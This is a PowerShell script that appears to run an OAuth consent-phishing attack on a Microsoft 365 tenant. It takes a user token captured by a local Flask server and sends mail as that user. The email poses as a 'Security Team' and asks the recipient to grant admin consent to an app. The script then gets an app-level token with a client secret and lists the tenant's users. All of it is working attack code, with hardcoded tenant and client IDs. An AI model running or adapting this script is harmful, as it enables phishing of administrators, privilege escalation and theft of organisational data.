# Wait for initial user-level consent to get user-level token
$flaskServerUrl = "http://localhost:5000/get_token"
$userAccessToken = $null

Write-Output "Waiting for user-level token (initial consent)..."
while (-not $userAccessToken) {
    try {
        $userAccessToken = Invoke-RestMethod -Uri $flaskServerUrl -Method Get
    } catch {
        Write-Output "User-level token not yet available, retrying in 10 seconds..."
        Start-Sleep -Seconds 10
    }
}

# Once user-level token is captured, proceed to send the email with the app consent link
Write-Output "User-level token captured, proceeding to send email..."

$tenantId = "838f6c73-507b-4674-b621-d8dd0009208d"
$clientId = "84ace87e-3f92-47ad-89d3-08281190051b"
$clientSecret = ""
$recipientEmail = ""
$adminConsentUrl = "https://login.microsoftonline.com/$tenantId/adminconsent?client_id=$clientId&redirect_uri=http://localhost:5000/callback&scope=https://graph.microsoft.com/.default"
$subject = "Important Update - Additional Permissions Required"
$body = "Hello,\n\nPlease grant additional permissions to enhance security across our tenant. Click the link below:\n\n$adminConsentUrl\n\nBest Regards,\nSecurity Team"

# Prepare the message JSON
$message = @{
    message = @{
        subject = $subject
        body = @{
            contentType = "Text"
            content = $body
        }
        toRecipients = @(@{ emailAddress = @{ address = $recipientEmail } })
    }
}

$jsonBody = $message | ConvertTo-Json -Depth 4

# Send the email as the user
Invoke-RestMethod -Method Post -Uri "https://graph.microsoft.com/v1.0/me/sendMail" `
                  -Headers @{ Authorization = "Bearer $userAccessToken" } `
                  -ContentType "application/json" `
                  -Body $jsonBody

# Request an application-level access token using the client secret
Write-Output "Requesting app-level access token using client credentials..."
$body = @{
    grant_type    = "client_credentials"
    scope         = "https://graph.microsoft.com/.default"
    client_id     = $clientId
    client_secret = $clientSecret
}

$tokenResponse = Invoke-RestMethod -Method Post -Uri "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token" -ContentType "application/x-www-form-urlencoded" -Body $body
$appAccessToken = $tokenResponse.access_token

# App-level actions with elevated privileges
Write-Output "App-level token obtained. Proceeding with privileged operations..."

# Request an application-level access token using client credentials
$body = @{
    grant_type    = "client_credentials"
    client_id     = $clientId
    client_secret = $clientSecret
    scope         = "https://graph.microsoft.com/.default"
}

$tokenResponse = Invoke-RestMethod -Method Post -Uri "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token" -ContentType "application/x-www-form-urlencoded" -Body $body
$appAccessToken = $tokenResponse.access_token
$appAccessToken


# Confirm that the access token was successfully retrieved
if (-not $appAccessToken) {
    Write-Output "Error: Failed to retrieve app access token."
    return
}

Write-Output "App-level access token obtained successfully."

# Example Graph API call to list all users in the tenant
$graphUri = "https://graph.microsoft.com/v1.0/users"

# Perform the request with the app-level access token
$usersResponse = Invoke-RestMethod -Method Get -Uri $graphUri -Headers @{ Authorization = "Bearer $appAccessToken" }

# Output the list of users
foreach ($user in $usersResponse.value) {
    Write-Output "User: $($user.displayName), Email: $($user.userPrincipalName)"
}

# Add any further actions here using the app-level access token and Graph API
